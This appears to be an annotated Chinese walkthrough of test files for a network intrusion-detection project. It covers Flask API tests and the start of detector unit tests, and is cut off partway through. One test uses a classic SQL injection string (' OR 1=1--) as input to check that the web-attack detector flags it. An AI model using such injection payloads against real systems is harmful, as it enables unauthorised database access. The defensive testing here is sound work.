| 121 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .order_by(AlertHistory.id.asc())` |
| 122 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .all()` |
| 123 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 124 | 断言：验证测试或运行时假设是否成立。 | `        assert len(rows) == 1` |
| 125 | 断言：验证测试或运行时假设是否成立。 | `        assert rows[0].from_status == "open"` |
| 126 | 断言：验证测试或运行时假设是否成立。 | `        assert rows[0].to_status == "acknowledged"` |
| 127 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 128 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 129 | 函数定义：声明 `test_alert_api_reads_and_updates_db` 的输入、处理逻辑和返回结果。 | `def test_alert_api_reads_and_updates_db(monkeypatch, tmp_path):` |
| 130 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app = _build_test_app(monkeypatch, tmp_path)` |
| 131 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    client = app.test_client()` |
| 132 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    headers = _auth_headers(client)` |
| 133 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 134 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.app import push_alert` |
| 135 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 136 | 上下文管理：自动管理资源打开与释放。 | `    with app.app_context():` |
| 137 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        inserted = push_alert(` |
| 138 | 代码语句：参与当前文件的业务流程或数据处理。 | `            app,` |
| 139 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 140 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "id": uuid.uuid4().hex,` |
| 141 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "timestamp": datetime.now(timezone.utc).isoformat(),` |
| 142 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "source_ip": "9.9.9.9",` |
| 143 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "dest_ip": "10.0.0.9",` |
| 144 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "threat_type": "xss",` |
| 145 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "level": "medium",` |
| 146 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "status": "open",` |
| 147 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "summary": "XSS 告警",` |
| 148 | 代码语句：参与当前文件的业务流程或数据处理。 | `            },` |
| 149 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 150 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 151 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    list_resp = client.get("/api/alerts", headers=headers)` |
| 152 | 断言：验证测试或运行时假设是否成立。 | `    assert list_resp.status_code == 200` |
| 153 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    data = list_resp.get_json()` |
| 154 | 断言：验证测试或运行时假设是否成立。 | `    assert any(item["id"] == inserted["id"] for item in data)` |
| 155 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 156 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    detail_resp = client.get(f"/api/alerts/{inserted['id']}", headers=headers)` |
| 157 | 断言：验证测试或运行时假设是否成立。 | `    assert detail_resp.status_code == 200` |
| 158 | 断言：验证测试或运行时假设是否成立。 | `    assert detail_resp.get_json()["threat_type"] == "xss"` |
| 159 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 160 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    update_resp = client.post(` |
| 161 | 代码语句：参与当前文件的业务流程或数据处理。 | `        f"/api/alerts/{inserted['id']}/status",` |
| 162 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        headers=headers,` |
| 163 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        json={"status": "acknowledged", "note": "手动确认"},` |
| 164 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 165 | 断言：验证测试或运行时假设是否成立。 | `    assert update_resp.status_code == 200` |
| 166 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    body = update_resp.get_json()` |
| 167 | 断言：验证测试或运行时假设是否成立。 | `    assert body["status"] == "acknowledged"` |
| 168 | 断言：验证测试或运行时假设是否成立。 | `    assert body["history"][-1]["status"] == "acknowledged"` |
| 169 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 170 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 171 | 函数定义：声明 `test_settings_persist_and_reload` 的输入、处理逻辑和返回结果。 | `def test_settings_persist_and_reload(monkeypatch, tmp_path):` |
| 172 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    db_file = tmp_path / "settings_roundtrip.db"` |
| 173 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("FLASK_ENV", "testing")` |
| 174 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("DATABASE_URL", f"sqlite:///{db_file.as_posix()}")` |
| 175 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("SECRET_KEY", "test-secret-key-which-is-at-least-32b")` |
| 176 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ADMIN_USERNAME", "admin")` |
| 177 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ADMIN_PASSWORD", "changeme")` |
| 178 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 179 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.app import create_app` |
| 180 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 181 | 函数调用：执行已有函数/方法完成当前步骤。 | `    app1, _ = create_app()` |
| 182 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app1.config["TESTING"] = True` |
| 183 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    c1 = app1.test_client()` |
| 184 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    h1 = _auth_headers(c1)` |
| 185 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r1 = c1.put(` |
| 186 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "/api/settings",` |
| 187 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        headers=h1,` |
| 188 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        json={` |
| 189 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "detection_sensitivity": 0.55,` |
| 190 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "alert_threshold": 0.5,` |
| 191 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "model_version": "v2.1",` |
| 192 | 代码语句：参与当前文件的业务流程或数据处理。 | `        },` |
| 193 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 194 | 断言：验证测试或运行时假设是否成立。 | `    assert r1.status_code == 200` |
| 195 | 断言：验证测试或运行时假设是否成立。 | `    assert r1.get_json()["editable"]["model_version"] == "v2.1"` |
| 196 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 197 | 函数调用：执行已有函数/方法完成当前步骤。 | `    app2, _ = create_app()` |
| 198 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app2.config["TESTING"] = True` |
| 199 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    c2 = app2.test_client()` |
| 200 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    h2 = _auth_headers(c2)` |
| 201 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r2 = c2.get("/api/settings", headers=h2)` |
| 202 | 断言：验证测试或运行时假设是否成立。 | `    assert r2.status_code == 200` |
| 203 | 断言：验证测试或运行时假设是否成立。 | `    assert r2.get_json()["editable"]["model_version"] == "v2.1"` |
| 204 | 断言：验证测试或运行时假设是否成立。 | `    assert abs(r2.get_json()["editable"]["detection_sensitivity"] - 0.55) < 1e-6` |
| 205 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 206 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 207 | 函数定义：声明 `test_rules_crud_db` 的输入、处理逻辑和返回结果。 | `def test_rules_crud_db(monkeypatch, tmp_path):` |
| 208 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app = _build_test_app(monkeypatch, tmp_path)` |
| 209 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    client = app.test_client()` |
| 210 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    headers = _auth_headers(client)` |
| 211 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 212 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    create = client.post(` |
| 213 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "/api/rules",` |
| 214 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        headers=headers,` |
| 215 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        json={` |
| 216 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "name": "rule-db-test",` |
| 217 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "type": "signature",` |
| 218 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "pattern": "/evil/",` |
| 219 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "action": "alert",` |
| 220 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "level": "high",` |
| 221 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "priority": 10,` |
| 222 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "enabled": True,` |
| 223 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "description": "db test",` |
| 224 | 代码语句：参与当前文件的业务流程或数据处理。 | `        },` |
| 225 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 226 | 断言：验证测试或运行时假设是否成立。 | `    assert create.status_code == 201` |
| 227 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    rid = create.get_json()["id"]` |
| 228 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 229 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    lst = client.get("/api/rules", headers=headers)` |
| 230 | 断言：验证测试或运行时假设是否成立。 | `    assert lst.status_code == 200` |
| 231 | 断言：验证测试或运行时假设是否成立。 | `    assert any(r["id"] == rid for r in lst.get_json())` |
| 232 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 233 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    detail = client.get(f"/api/rules/{rid}", headers=headers)` |
| 234 | 断言：验证测试或运行时假设是否成立。 | `    assert detail.status_code == 200` |
| 235 | 断言：验证测试或运行时假设是否成立。 | `    assert detail.get_json()["name"] == "rule-db-test"` |
| 236 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 237 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.database import db` |
| 238 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.models import Rule` |
| 239 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 240 | 上下文管理：自动管理资源打开与释放。 | `    with app.app_context():` |
| 241 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row = db.session.get(Rule, rid)` |
| 242 | 断言：验证测试或运行时假设是否成立。 | `        assert row is not None` |
| 243 | 断言：验证测试或运行时假设是否成立。 | `        assert row.rule_type == "signature"` |
| 244 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 245 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 246 | 函数定义：声明 `test_report_summary_from_db` 的输入、处理逻辑和返回结果。 | `def test_report_summary_from_db(monkeypatch, tmp_path):` |
| 247 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app = _build_test_app(monkeypatch, tmp_path)` |
| 248 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    client = app.test_client()` |
| 249 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    headers = _auth_headers(client)` |
| 250 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 251 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.app import push_alert` |
| 252 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 253 | 上下文管理：自动管理资源打开与释放。 | `    with app.app_context():` |
| 254 | 函数调用：执行已有函数/方法完成当前步骤。 | `        push_alert(` |
| 255 | 代码语句：参与当前文件的业务流程或数据处理。 | `            app,` |
| 256 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 257 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "id": "rep-alert-1",` |
| 258 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "timestamp": datetime.now(timezone.utc).isoformat(),` |
| 259 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "source_ip": "1.1.1.1",` |
| 260 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "threat_type": "scan",` |
| 261 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "level": "high",` |
| 262 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "status": "open",` |
| 263 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "summary": "测试",` |
| 264 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "confidence": 0.85,` |
| 265 | 代码语句：参与当前文件的业务流程或数据处理。 | `            },` |
| 266 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 267 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 268 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    summ = client.get("/api/reports/summary?period=day", headers=headers)` |
| 269 | 断言：验证测试或运行时假设是否成立。 | `    assert summ.status_code == 200` |
| 270 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    body = summ.get_json()` |
| 271 | 断言：验证测试或运行时假设是否成立。 | `    assert body["overview"]["total_alerts"] >= 1` |
| 272 | 断言：验证测试或运行时假设是否成立。 | `    assert any(x["level"] == "high" for x in body["threats"]["by_level"])` |
| 273 | 断言：验证测试或运行时假设是否成立。 | `    assert "model_performance" in body` |
| 274 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 275 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    exp = client.get("/api/reports/export?period=day&format=html", headers=headers)` |
| 276 | 断言：验证测试或运行时假设是否成立。 | `    assert exp.status_code == 200` |
| 277 | 断言：验证测试或运行时假设是否成立。 | `    assert b"guardian-report-export" in exp.data` |

## `tests/test_detectors.py`

- 类型：测试
- 行数：424

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `Phase 4 威胁检测层 - 单元测试` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §5 / Phase 4 提示词验收标准` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `运行方式：` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    cd ai-security-guardian` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `    python -m pytest tests/test_detectors.py -v` |
| 8 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `测试覆盖：` |
| 10 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - DetectionResult 数据类` |
| 11 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - DDoSDetector（模型未加载时返回 None）` |
| 12 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - IntrusionDetector（双模式切换）` |
| 13 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - WebAttackDetector（规则命中、URL 多层解码防绕过、误报）` |
| 14 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - AnomalyDetector（双模型协同）` |
| 15 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - FusionEngine（正常、单引擎、多引擎联动升级）` |
| 16 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 17 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 18 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 19 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 20 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 21 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 22 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import pytest` |
| 23 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 24 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), os.pardir))` |
| 25 | 条件判断：满足条件时进入对应分支。 | `if PROJECT_ROOT not in sys.path:` |
| 26 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.path.insert(0, PROJECT_ROOT)` |
| 27 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 28 | 导入对象：从指定模块引入类、函数或常量。 | `from src.decision.fusion_engine import FusionEngine  # noqa: E402` |
| 29 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.anomaly_detector import AnomalyDetector  # noqa: E402` |
| 30 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.base import BaseDetector, DetectionResult  # noqa: E402` |
| 31 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.ddos_detector import DDoSDetector  # noqa: E402` |
| 32 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.intrusion_detector import IntrusionDetector  # noqa: E402` |
| 33 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.web_detector import WebAttackDetector  # noqa: E402` |
| 34 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.nsl_kdd_adapter import NSL_KDD_FEATURE_COLUMNS  # noqa: E402` |
| 35 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 36 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 37 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 38 | 注释：解释下面或当前这段代码的设计意图。 | `# 1. DetectionResult 数据类` |
| 39 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 40 | 类定义：声明 `TestDetectionResult`，封装相关状态与行为。 | `class TestDetectionResult:` |
| 41 | 函数定义：声明 `test_all_fields_initialized` 的输入、处理逻辑和返回结果。 | `    def test_all_fields_initialized(self):` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = DetectionResult(` |
| 43 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            threat_type="ddos",` |
| 44 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            threat_level="high",` |
| 45 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            confidence=0.92,` |
| 46 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            details="测试",` |
| 47 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            source_ip="10.0.0.1",` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            raw_data={"k": "v"},` |
| 49 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 50 | 断言：验证测试或运行时假设是否成立。 | `        assert result.threat_type == "ddos"` |
| 51 | 断言：验证测试或运行时假设是否成立。 | `        assert result.threat_level == "high"` |
| 52 | 断言：验证测试或运行时假设是否成立。 | `        assert result.confidence == pytest.approx(0.92)` |
| 53 | 断言：验证测试或运行时假设是否成立。 | `        assert result.details == "测试"` |
| 54 | 断言：验证测试或运行时假设是否成立。 | `        assert result.source_ip == "10.0.0.1"` |
| 55 | 断言：验证测试或运行时假设是否成立。 | `        assert result.raw_data == {"k": "v"}` |
| 56 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 57 | 函数定义：声明 `test_default_values` 的输入、处理逻辑和返回结果。 | `    def test_default_values(self):` |
| 58 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = DetectionResult(` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            threat_type="normal",` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            threat_level="low",` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            confidence=1.0,` |
| 62 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            details="ok",` |
| 63 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 64 | 断言：验证测试或运行时假设是否成立。 | `        assert result.source_ip == ""` |
| 65 | 断言：验证测试或运行时假设是否成立。 | `        assert result.raw_data == {}` |
| 66 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 67 | 函数定义：声明 `test_default_factory_isolated` 的输入、处理逻辑和返回结果。 | `    def test_default_factory_isolated(self):` |
| 68 | 文档字符串：说明当前模块、类或函数的职责。 | `        """默认 raw_data 必须是 dict 的独立实例（测试 field(default_factory=dict)）。"""` |
| 69 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        r1 = DetectionResult("normal", "low", 1.0, "a")` |
| 70 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        r2 = DetectionResult("normal", "low", 1.0, "b")` |
| 71 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        r1.raw_data["x"] = 1` |
| 72 | 断言：验证测试或运行时假设是否成立。 | `        assert "x" not in r2.raw_data` |
| 73 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 74 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 75 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 76 | 注释：解释下面或当前这段代码的设计意图。 | `# 2. DDoSDetector` |
| 77 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 78 | 类定义：声明 `TestDDoSDetector`，封装相关状态与行为。 | `class TestDDoSDetector:` |
| 79 | 函数定义：声明 `test_detect_without_model_returns_none` 的输入、处理逻辑和返回结果。 | `    def test_detect_without_model_returns_none(self):` |
| 80 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        detector = DDoSDetector()` |
| 81 | 断言：验证测试或运行时假设是否成立。 | `        assert detector.is_ready is False` |
| 82 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = detector.detect({"duration": 0, "src_bytes": 100})` |
| 83 | 断言：验证测试或运行时假设是否成立。 | `        assert result is None` |
| 84 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 85 | 函数定义：声明 `test_is_instance_of_base` 的输入、处理逻辑和返回结果。 | `    def test_is_instance_of_base(self):` |
| 86 | 断言：验证测试或运行时假设是否成立。 | `        assert isinstance(DDoSDetector(), BaseDetector)` |
| 87 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 88 | 函数定义：声明 `test_nsl_reference_column_count_is_41` 的输入、处理逻辑和返回结果。 | `    def test_nsl_reference_column_count_is_41(self):` |
| 89 | 断言：验证测试或运行时假设是否成立。 | `        assert len(NSL_KDD_FEATURE_COLUMNS) == 41` |
| 90 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 91 | 函数定义：声明 `test_load_model_missing_file` 的输入、处理逻辑和返回结果。 | `    def test_load_model_missing_file(self, tmp_path):` |
| 92 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        detector = DDoSDetector()` |
| 93 | 上下文管理：自动管理资源打开与释放。 | `        with pytest.raises(Exception):` |
| 94 | 函数调用：执行已有函数/方法完成当前步骤。 | `            detector.load_model(str(tmp_path / "not_exist.pkl"))` |
| 95 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 96 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 97 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 98 | 注释：解释下面或当前这段代码的设计意图。 | `# 3. IntrusionDetector` |
| 99 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 100 | 类定义：声明 `TestIntrusionDetector`，封装相关状态与行为。 | `class TestIntrusionDetector:` |
| 101 | 函数定义：声明 `test_default_mode_is_random_forest` 的输入、处理逻辑和返回结果。 | `    def test_default_mode_is_random_forest(self):` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        detector = IntrusionDetector()` |
| 103 | 断言：验证测试或运行时假设是否成立。 | `        assert detector.use_deep_learning is False` |
| 104 | 断言：验证测试或运行时假设是否成立。 | `        assert detector.is_ready is False` |
| 105 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 106 | 函数定义：声明 `test_deep_learning_mode_flag` 的输入、处理逻辑和返回结果。 | `    def test_deep_learning_mode_flag(self):` |
| 107 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        detector = IntrusionDetector(use_deep_learning=True)` |
| 108 | 断言：验证测试或运行时假设是否成立。 | `        assert detector.use_deep_learning is True` |
| 109 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 110 | 函数定义：声明 `test_detect_without_model_returns_none` 的输入、处理逻辑和返回结果。 | `    def test_detect_without_model_returns_none(self):` |
| 111 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        detector = IntrusionDetector()` |
| 112 | 断言：验证测试或运行时假设是否成立。 | `        assert detector.detect({"duration": 0}) is None` |
| 113 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 114 | 函数定义：声明 `test_is_instance_of_base` 的输入、处理逻辑和返回结果。 | `    def test_is_instance_of_base(self):` |
| 115 | 断言：验证测试或运行时假设是否成立。 | `        assert isinstance(IntrusionDetector(), BaseDetector)` |
| 116 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 117 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 118 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 119 | 注释：解释下面或当前这段代码的设计意图。 | `# 4. WebAttackDetector` |
| 120 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 121 | 类定义：声明 `TestWebAttackDetector`，封装相关状态与行为。 | `class TestWebAttackDetector:` |
| 122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _SRC = "198.51.100.77"` |
| 123 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 124 | 装饰器：为下面的函数或类附加框架行为。 | `    @pytest.fixture()` |
| 125 | 函数定义：声明 `detector` 的输入、处理逻辑和返回结果。 | `    def detector(self):` |
| 126 | 返回结果：把处理后的值交回调用方。 | `        return WebAttackDetector()` |
| 127 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 128 | 函数定义：声明 `_feat` 的输入、处理逻辑和返回结果。 | `    def _feat(self, **kwargs):` |
| 129 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        base = {` |
| 130 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "src_ip": self._SRC,` |
| 131 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "http_method": "GET",` |
| 132 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "method": "GET",` |
| 133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "status_code": 200,` |
| 134 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 135 | 函数调用：执行已有函数/方法完成当前步骤。 | `        base.update(kwargs)` |
| 136 | 返回结果：把处理后的值交回调用方。 | `        return base` |
| 137 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 138 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 规则命中 ----` |
| 139 | 函数定义：声明 `test_sql_injection_detected` 的输入、处理逻辑和返回结果。 | `    def test_sql_injection_detected(self, detector):` |
| 140 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = detector.detect(self._feat(url_raw="/api?id=1' OR 1=1--"))` |
| 141 | 断言：验证测试或运行时假设是否成立。 | `        assert result is not None` |
| 142 | 断言：验证测试或运行时假设是否成立。 | `        assert result.threat_type == "web_attack"` |
| 143 | 断言：验证测试或运行时假设是否成立。 | `        assert result.threat_level == "high"` |
| 144 | 断言：验证测试或运行时假设是否成立。 | `        assert result.confidence == pytest.approx(0.95)` |
| 145 | 断言：验证测试或运行时假设是否成立。 | `        assert "sql_injection" in result.details` |
